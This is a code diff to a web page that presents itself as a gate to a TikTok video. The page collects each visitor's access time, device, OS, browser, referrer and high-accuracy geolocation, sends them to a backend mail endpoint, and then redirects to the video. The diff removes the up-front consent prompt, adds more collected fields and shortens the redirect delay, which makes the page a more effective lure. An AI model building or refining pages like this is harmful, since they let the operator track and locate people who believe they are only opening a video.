@@ -5,23 +5,80 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Watch TikTok Video</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 24px; max-width: 720px; }
-    button { padding: 10px 16px; }
-    #status { margin-top: 12px; line-height: 1.4; }
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f8f8f8;
+    }
+    .center-box {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+      padding: 32px 24px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      margin-top: 18px;
+      border-radius: 6px;
+      border: none;
+      background: #25f4ee;
+      color: #222;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #1ad1c2;
+    }
+    #status {
+      margin-top: 18px;
+      color: #555;
+      font-size: 15px;
+      min-height: 24px;
+    }
+    .info-list {
+      text-align: left;
+      margin: 18px 0 0 0;
+      font-size: 15px;
+      color: #444;
+    }
+    .info-list li {
+      margin-bottom: 6px;
+    }
   </style>
 </head>
 <body>
-  <h1>Watch TikTok Video</h1>
-  <p>
-    To watch this TikTok, please confirm and send your info.
-  </p>
-  <button id="confirm">Confirm & Watch</button>
-  <div id="status"></div>
+  <div class="center-box">
+    <h2>Watch TikTok Video</h2>
+    <p>
+      To continue, please confirm and share the following information:
+    </p>
+    <ul class="info-list">
+      <li><b>Time</b> (when you access this page)</li>
+      <li><b>Device & OS</b> (e.g. Android, iPhone, Windows)</li>
+      <li><b>Browser</b> (e.g. Chrome, TikTok in-app, Safari)</li>
+      <li><b>Referrer</b> (where you came from, e.g. TikTok, YouTube)</li>
+      <li><b>Location</b> (optional, will ask next)</li>
+    </ul>
+    <button id="confirm">Confirm & Continue</button>
+    <div id="status"></div>
+  </div>
   <script>
     const statusEl = document.getElementById("status");
     const confirmBtn = document.getElementById("confirm");
     const API_URL = "/api/sendMail"; // Your backend endpoint
-    const TIKTOK_URL = "https://www.tiktok.com/@lebronjameshairline33/video/7605061881388141854?is_from_webapp=1&sender_device=pc"; // The real TikTok video
+    const TIKTOK_URL = "https://www.tiktok.com/@username/video/1234567890"; // The real TikTok video
 
     function getOSVersion() {
       const ua = navigator.userAgent;
@@ -53,36 +110,55 @@
       return "Unknown";
     }
 
+    function getBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.includes("TikTok")) return "TikTok In-App Browser";
+      if (ua.includes("FBAN") || ua.includes("FBAV")) return "Facebook In-App Browser";
+      if (ua.includes("Instagram")) return "Instagram In-App Browser";
+      if (ua.includes("CriOS")) return "Chrome (iOS)";
+      if (ua.includes("FxiOS")) return "Firefox (iOS)";
+      if (ua.includes("EdgiOS")) return "Edge (iOS)";
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Edg")) return "Edge";
+      return "Unknown";
+    }
+
+    function getReferrer() {
+      if (document.referrer) return document.referrer;
+      return "None";
+    }
+
     confirmBtn.onclick = async () => {
-      if (!confirm("Do you agree to send your info (time, device, and optionally location) to continue?")) {
-        statusEl.textContent = "You must confirm to continue.";
-        return;
-      }
+      confirmBtn.disabled = true;
       statusEl.textContent = "Preparing to send info…";
       const timestamp = new Date().toISOString();
       const osVersion = getOSVersion();
+      const browser = getBrowser();
+      const referrer = getReferrer();
 
       // Ask for location
       if (confirm("Do you also want to share your location (latitude/longitude)?")) {
         if (!navigator.geolocation) {
           statusEl.textContent = "Geolocation not supported. Sending without location.";
-          await sendInfo({ timestamp, osVersion });
+          await sendInfo({ timestamp, osVersion, browser, referrer });
           return;
         }
         statusEl.textContent = "Requesting location permission…";
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
-            const { latitude, longitude } = pos.coords;
-            await sendInfo({ timestamp, osVersion, latitude, longitude });
+            const { latitude, longitude, accuracy } = pos.coords;
+            await sendInfo({ timestamp, osVersion, browser, referrer, latitude, longitude, accuracy });
           },
           async (err) => {
             statusEl.textContent = "Location permission denied. Sending without location.";
-            await sendInfo({ timestamp, osVersion });
+            await sendInfo({ timestamp, osVersion, browser, referrer });
           },
-          { enableHighAccuracy: true, timeout: 10000 }
+          { enableHighAccuracy: true, timeout: 7000 }
         );
       } else {
-        await sendInfo({ timestamp, osVersion });
+        await sendInfo({ timestamp, osVersion, browser, referrer });
       }
     };
 
@@ -96,14 +172,16 @@
         });
         if (!res.ok) {
           statusEl.textContent = "Failed to send info. Please try again.";
+          confirmBtn.disabled = false;
           return;
         }
-        statusEl.innerHTML = "<b>Info sent! Redirecting to TikTok…</b>";
+        statusEl.innerHTML = "<b>Info sent! Redirecting…</b>";
         setTimeout(() => {
           window.location.href = TIKTOK_URL;
-        }, 1500);
+        }, 900);
       } catch (e) {
         statusEl.textContent = "Network error. Try again.";
+        confirmBtn.disabled = false;
       }
     }
   </script>
